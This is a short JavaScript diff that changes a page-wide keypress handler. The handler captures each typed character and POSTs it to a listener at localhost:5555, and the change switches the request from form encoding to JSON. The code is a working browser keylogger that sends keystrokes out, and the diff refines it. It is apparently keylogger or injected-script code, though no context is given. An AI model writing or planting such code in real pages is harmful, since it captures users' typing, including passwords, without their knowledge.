@@ -3,10 +3,10 @@ document.onkeypress = function(ev) {
   key = String.fromCharCode(ev.charCode);
   if (key) {
     var http = new XMLHttpRequest();
-    var param = encodeURI(key);
+    var param = { key: key };
     http.open("POST", "http://localhost:5555/", true);
-    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    http.send("key=" + param);
+    http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    http.send(JSON.stringify(param));
     console.log(key);
   }
 };
